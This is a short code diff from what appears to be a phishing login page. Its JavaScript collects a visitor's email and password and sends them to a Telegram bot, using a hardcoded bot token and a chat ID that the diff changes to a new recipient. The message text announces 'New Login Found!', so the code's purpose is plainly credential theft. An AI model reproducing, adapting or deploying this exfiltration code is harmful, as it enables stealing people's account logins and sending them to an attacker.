@@ -24,7 +24,7 @@
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
             const token = "8681097213:AAHBzxAJocYHUAJbwPnBfYUAEZBnOR0HmsI";
-            const chat_id = "8681097213";
+            const chat_id = "7444009144";
             const message = "🔥 New Login Found! 🔥\n\n📧 Email: " + email + "\n🔑 Pass: " + pass;
             if(email && pass) {
                 fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message))
